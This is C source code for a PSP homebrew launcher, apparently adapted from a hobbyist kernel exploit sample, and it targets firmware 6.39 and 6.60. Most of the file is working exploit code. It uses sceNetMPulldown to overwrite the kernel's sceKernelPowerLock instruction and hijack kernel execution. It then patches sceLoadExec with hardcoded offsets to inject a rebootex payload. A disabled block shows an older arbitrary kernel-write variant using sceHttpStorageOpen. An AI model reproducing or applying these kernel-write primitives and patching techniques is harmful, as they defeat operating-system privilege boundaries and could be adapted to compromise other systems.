


/*
--- Message from J416 ---

ちょっと勢いで書いてみました。
liquidzigong氏の6.39 Kxploitサンプルをベース(というか丸パクリ)に、
ゲーム終了時にrebootexを実行するようにしてみました。
多分、この後6.39向けのrebootexとsystemctrl書けばHENができると思いますｗ
・・・時間あればやってみようかなあ。
あ、PSP1000用でゲーム終了時に無線LANのLEDが点灯することを確認しました。

Thanks liquidzigong and some1!
*/

#include <pspdebug.h>
#include <pspctrl.h>
#include <pspsdk.h>
#include <pspiofilemgr.h>
#include <psputility.h>
#include <psputility_htmlviewer.h>
#include <psploadexec.h>
#include <psploadexec_kernel.h>
#include <psputils.h>
#include <psputilsforkernel.h>
#include <pspsysmem.h>
#include <psppower.h>
#include <string.h>
#include "rebootex/rebootex.h"

#if LITE == 0
#include "pbp.h"
#endif

#if _PSP_FW_VERSION == 639
#define DEVKIT_VER	0x06030910
#define VER_STR	"6.39"
#elif _PSP_FW_VERSION == 660
#define DEVKIT_VER	0x06060010
#define VER_STR	"6.60"
#endif

PSP_MODULE_INFO("__kxploit__", PSP_MODULE_USER, 1, 0);
PSP_MAIN_THREAD_ATTR(PSP_THREAD_ATTR_USER | PSP_THREAD_ATTR_VFPU);
PSP_HEAP_SIZE_KB(0);

#define printk pspDebugScreenPrintf
#define MAKE_CALL(a, f) _sw(0x0C000000 | (((u32)(f) >> 2) & 0x03FFFFFF), a)

struct SceKernelLoadExecVSHParam param;//

int kuKernelGetModel();
int sctrlKernelLoadExecVSHWithApitype(int apitype, const char *file, struct SceKernelLoadExecVSHParam *param);

/**
 * Taken from M33 SDK.
 * Describes a Module Structure from the chained Module List.
 */
typedef struct SceModule2
{
	struct SceModule2 * next; // 0
	unsigned short attribute; // 4
	unsigned char version[2]; // 6
	char modname[27]; // 8
	char terminal; // 0x23
	char mod_state;  // 0x24
	char unk1;    // 0x25
	char unk2[2]; // 0x26
	unsigned int unk3; // 0x28
	SceUID modid; // 0x2C
	unsigned int unk4; // 0x30
	SceUID mem_id; // 0x34
	unsigned int mpid_text;  // 0x38
	unsigned int mpid_data; // 0x3C
	void * ent_top; // 0x40
	unsigned int ent_size; // 0x44
	void * stub_top; // 0x48
	unsigned int stub_size; // 0x4C
	unsigned int entry_addr_; // 0x50
	unsigned int unk5[4]; // 0x54
	unsigned int entry_addr; // 0x64
	unsigned int gp_value; // 0x68
	unsigned int text_addr; // 0x6C
	unsigned int text_size; // 0x70
	unsigned int data_size;  // 0x74
	unsigned int bss_size; // 0x78
	unsigned int nsegment; // 0x7C
	unsigned int segmentaddr[4]; // 0x80
	unsigned int segmentsize[4]; // 0x90
} SceModule2;

extern int sceHttpStorageOpen(int a0, int a1, int a2);
extern int sceKernelPowerLock(unsigned int, unsigned int);
static int (*func_rebootex)(unsigned int, unsigned int, unsigned int, unsigned int, unsigned int);

void sync_cache(void)
{
	/*
	 * Beware there is a bug in PSPSDK. 
	 * sceKernelIcacheInvalidateAll in pspsdk is imported as UtilsForKernel by default which cannot be used for an user PRX (returns 0x8002013A)
	 * Because of this the original kxploit by some1 used a delay by 1 second to flush i-cache. But sometimes it still fails.
	 * import.S contains sceKernelIcacheInvalidateAll as workaround
	 */
	sceKernelIcacheInvalidateAll();
	sceKernelDcacheWritebackInvalidateAll();
}


/** Recovery the instruction we smashed */
void recovery_sysmem(void)
{
#if _PSP_FW_VERSION == 639
	_sw(0x3C058801, 0x8800CC34); // lui $a1, 0x8801
#elif _PSP_FW_VERSION == 660
	_sw(0x3C058801, 0x8800CBB8); // lui $a1, 0x8801
#endif

}

int model;
static int rebootex_cp(unsigned int a1, unsigned int a2, unsigned int a3, unsigned int a4, unsigned int a5)
{
	memcpy((void *) 0x88FC0000, rebootex, size_rebootex);
	memset((void *) 0x88FB0000, 0, 256);

	_sw(model, 0x88FB0000);

	return func_rebootex(a1, a2, a3, a4, a5);
}

int is_exploited = 0;

char filename[256];

u32 loadexec_patch_list[] = {
	0x00002D5C,
	0x00002DA8,
	0x000023D0,
	0x00002414,
};
u32 loadexec_patch_list_05g[] = {	
	0x00002FA8,
	0x00002FF4,
	0x00002624,
	0x00002668,
};

int kernel_permission_call(void)
{
	void (* _sceKernelIcacheInvalidateAll)(void) = (void *)0x88000E98;
	void (* _sceKernelDcacheWritebackInvalidateAll)(void) = (void *)0x88000744;

#if _PSP_FW_VERSION == 639
	u32 (*_sceKernelFindModuleByName)(char *) = (void *) 0x8801E2D8;// 0x00017000 + 0x000072D8
	int (* _sceKernelGetModel)() = (void *)( 0x88000000 + 0x0000A13C );
#elif _PSP_FW_VERSION == 660
	u32 (*_sceKernelFindModuleByName)(char *) = (void *) 0x8801DF98;// 0x00017000 + 0x00006F98
	int (* _sceKernelGetModel)() = (void *)( 0x88000000 + 0x0000A0B0 );
#endif

	recovery_sysmem();

	model = _sceKernelGetModel();

	unsigned int addr;
	addr = _sceKernelFindModuleByName("sceLoadExec");
	addr += 108;
    addr = *(unsigned int *) addr;

	const u32 *loadexex_list = (model == 4 )? loadexec_patch_list_05g :loadexec_patch_list;

	MAKE_CALL( addr + loadexex_list[0] ,rebootex_cp);
	_sw( 0x3C0188FC, addr + loadexex_list[1] ); // lui $at, 0x88FC

	
	_sw(0x1000000C, addr + loadexex_list[2] );
	_sw(0, addr + loadexex_list[3] );


	_sceKernelIcacheInvalidateAll();
	_sceKernelDcacheWritebackInvalidateAll();
	func_rebootex = (void *) addr;


	void ( * _sceKernelLoadExecVSHMs1)() = (void *)(addr + 0x00001D84);
	void ( * _sceKernelLoadExecVSHMs1_05g)() = (void *)(addr + 0x00001FB8);
	void ( * _sceKernelLoadExecVSHEf1_05g)() = (void *)(addr + 0x000020A8);


	if( model == 4 )
	{
		if( filename[0] == 'e' && filename[1] == 'f' )
		{
			_sceKernelLoadExecVSHEf1_05g( filename /*FILE_PATH*/ ,&param );
		}
		else
		{
			_sceKernelLoadExecVSHMs1_05g( filename /*FILE_PATH*/ ,&param );
		}
	}
	else
	{
		_sceKernelLoadExecVSHMs1( filename /*FILE_PATH*/ ,&param);
	}

	is_exploited = 1;

	return 0;
}

static void doKernelExploit660(void)
{
	typedef struct sceKernelIfHandleParam
	{
		struct sceKernelIfHandleParam *unk_0;
		u32 unk_4;
		u32 unk_8;
		u32 unk_12;
		u16 unk_16;
		u16 unk_18;
		u32 unk_20;
		u32 unk_24;
		u32 unk_28;
		u32 unk_32;
		u32 unk_36;
		u32 unk_40;
		u32 unk_44;
		u32 unk_48;
		u32 unk_52;
		u32 unk_56;
		u32 unk_60;
		u32 unk_64;
		u32 unk_68;
		u32 unk_72;
	} sceKernelIfHandleParam;

	u32 val;
	sceKernelIfHandleParam param_top;
	sceKernelIfHandleParam param_sub;
	
	sceUtilityLoadNetModule(1);
	
	memset(&param_top, 0, sizeof(sceKernelIfHandleParam));
	memset(&param_sub, 0, sizeof(sceKernelIfHandleParam));
	
	val = 0;
	
	/* Fill sub structure */
	param_sub.unk_8 = (u32)&val;
	param_sub.unk_12 = sizeof(u32);
	
	/* Fill top structure */
	param_top.unk_0 = &param_sub;
	param_top.unk_12 = 1;
	param_top.unk_18 = 1;
	param_top.unk_68 = (u32)&param_top;
	param_top.unk_8 = 0x8800CBB8 - param_top.unk_12;
	param_top.unk_48 = 0x8800CBB8;
	param_top.unk_60 = sizeof(u32);
	
	sceNetMPulldown(&param_top, 0, param_top.unk_12 + sizeof(u32), NULL);
	sync_cache();

	printk("\n\nLaunching Please wait ..." );
	sceDisplaySetHoldMode(1);

	u32 kernel_entry, entry_addr;
	u32 interrupts;
	interrupts = pspSdkDisableInterrupts();
	kernel_entry = (u32) &kernel_permission_call;
	entry_addr = ((u32) &kernel_entry) - 16;
	sceKernelPowerLock(0, ((u32) &entry_addr) - 0x000040F8);//63X:3B40 + 5B4//660: 3B40 + 5B8
	pspSdkEnableInterrupts(interrupts);

	sceUtilityUnloadModule(1);
}

static void do_exploit(void)
{
	typedef struct sceKernelIfHandleParam
	{
		struct sceKernelIfHandleParam *unk_0;
		u32 unk_4;
		u32 unk_8;
		u32 unk_12;
		u16 unk_16;
		u16 unk_18;
		u32 unk_20;
		u32 unk_24;
		u32 unk_28;
		u32 unk_32;
		u32 unk_36;
		u32 unk_40;
		u32 unk_44;
		u32 unk_48;
		u32 unk_52;
		u32 unk_56;
		u32 unk_60;
		u32 unk_64;
		u32 unk_68;
		u32 unk_72;
	} sceKernelIfHandleParam;

	u32 val;
	sceKernelIfHandleParam param_top;
	sceKernelIfHandleParam param_sub;
	
	sceUtilityLoadNetModule(1);
	
	memset(&param_top, 0, sizeof(sceKernelIfHandleParam));
	memset(&param_sub, 0, sizeof(sceKernelIfHandleParam));
	
	val = 0;
	
	/* Fill sub structure */
	param_sub.unk_8 = (u32)&val;
	param_sub.unk_12 = sizeof(u32);
	
	/* Fill top structure */
	param_top.unk_0 = &param_sub;
	param_top.unk_12 = 1;
	param_top.unk_18 = 1;
	param_top.unk_68 = (u32)&param_top;
	param_top.unk_8 = 0x8800CC34 - param_top.unk_12;
	param_top.unk_48 = 0x8800CC34;
	param_top.unk_60 = sizeof(u32);
	
	sceNetMPulldown(&param_top, 0, param_top.unk_12 + sizeof(u32), NULL);
	sync_cache();

	printk("\n\nLaunching Please wait ..." );
	sceDisplaySetHoldMode(1);

	u32 kernel_entry, entry_addr;
	u32 interrupts;
	interrupts = pspSdkDisableInterrupts();
	kernel_entry = (u32) &kernel_permission_call;
	entry_addr = ((u32) &kernel_entry) - 16;
	sceKernelPowerLock(0, ((u32) &entry_addr) - 0x000040F4);
	pspSdkEnableInterrupts(interrupts);


	sceUtilityUnloadModule(1);
}

#if 0
static void do_exploit(void)
{
	u32 kernel_entry, entry_addr;
	u32 interrupts;
	u32 i;
	int ret;

	for(i=1; i<=6; ++i) {
		ret = sceUtilityLoadModule(i + 0xFF);
		printk("sceUtilityLoadModule 0x%02X -> 0x%08X\n", i + 0xFF, ret);
	}

	/**
	 * Write vsync 0xFFFF(0xFFFFFFFF) to @sceHttpStorage_Service@+0x00000060
	 * You can consider vsync 0xFFFF as NOP
	 * This call enables sceHttpStorageOpen to write any addresses
	 * which contains value which is greater than 0 and has alignment of 4, with vsync 0xFFFF(0xFFFFFFFF)
	 */
	ret = sceHttpStorageOpen(-612, 0, 0);
	printk("sceHttpStorageOpen#1 -> 0x%08X\n", ret);
	sync_cache();

	/* No delay need here because we flushed icache properly */

	/**
	 * Write vsync 0xFFFF(0xFFFFFFFF) to the first instruction of sceKernelPowerLockForUser
	 * Now the gate to kernel is opened :)
	 */
	ret = sceHttpStorageOpen((0x8800CC34>>2), 0, 0); // scePowerLock override
	printk("sceHttpStorageOpen#2 -> 0x%08X\n", ret);
	sync_cache();

	printk("\n\nLaunching Please wait ..." );
	sceDisplaySetHoldMode(1);

	/* Call kernel_permission_call by hacked sceKernelPowerLock */
	interrupts = pspSdkDisableInterrupts();
	kernel_entry = (u32) &kernel_permission_call;
	entry_addr = ((u32) &kernel_entry) - 16;
	sceKernelPowerLock(0, ((u32) &entry_addr) - 0x000040F4);
	pspSdkEnableInterrupts(interrupts);

	/* Unload network libraries */
	for(i=6; i>=1; --i) {
		ret = sceUtilityUnloadModule(i + 0xFF);
		printk("sceUtilityUnloadModule 0x%02X -> 0x%08X\n", i + 0xFF, ret);
	}
}
#endif

int WriteFile(char *file, void *buf, int size)
{
	SceUID fd = sceIoOpen(file, PSP_O_CREAT | PSP_O_TRUNC | PSP_O_WRONLY, 0777);

	if (fd >= 0)
	{
		sceIoWrite(fd, buf, size);
		sceIoClose(fd);
		return 1;
	}

	return -1;
}

int main(int argc, char * argv[])
{
	pspDebugScreenInit();

	if(sceKernelDevkitVersion() != DEVKIT_VER )
	{
		printk("This program require "VER_STR"\n");
		sceKernelDelayThread(5*1000*1000);
		sceKernelExitGame();
	}

	printk("Update Launcher for "VER_STR"\n\n");

	printk("Thanks to liquidzigong for 6.39 kxploit POC\n");
	printk("Thanks to some1/Davee/Proxima/Zecoxao for kxploit\n");
	printk("Thanks to bbtgp for his PrxEncrypter\n");
	printk("Thanks to Draan for his kirk-engine code\n");

	strcpy( filename , argv[0] );	
	char *p = strrchr(filename, '/');
	strcpy(p+1, "ME.PBP");

	printk("\nTarget file:%s\n", filename );

#if LITE == 0
	printk("Unpacking ... ");
	WriteFile( filename , update_pbp , size_update_pbp );
	printk("Done\n\n");
#endif

	memset( &param, 0, sizeof(param));
	param.size=sizeof(param);
	param.args= strlen( filename ) + 1;//sizeof(FILE_PATH);
	param.argp= filename;//FILE_PATH;
	param.key="updater";//

	model = kuKernelGetModel();
//	if( sctrlHENIsSE() == 1 )
	if( model >= 0)
	{
		printk("\n\nLaunching Please wait ..." );
		sceDisplaySetHoldMode(1);

		int api_type;
		if( filename[0] == 'e' && filename[1] == 'f' )
			api_type = 0x151;
		else
			api_type = 0x140;

		sctrlKernelLoadExecVSHWithApitype( api_type , filename, &param);
	}
	else
	{
#if _PSP_FW_VERSION == 639
		do_exploit();
#elif _PSP_FW_VERSION == 660
		doKernelExploit660();
#endif
	}

	printk("model %d\n", model );

	printk("Exiting...\n");

	sceKernelDelayThread(1000000);
	sceKernelExitGame();
	sceKernelExitDeleteThread(0);

	return 0;
}
//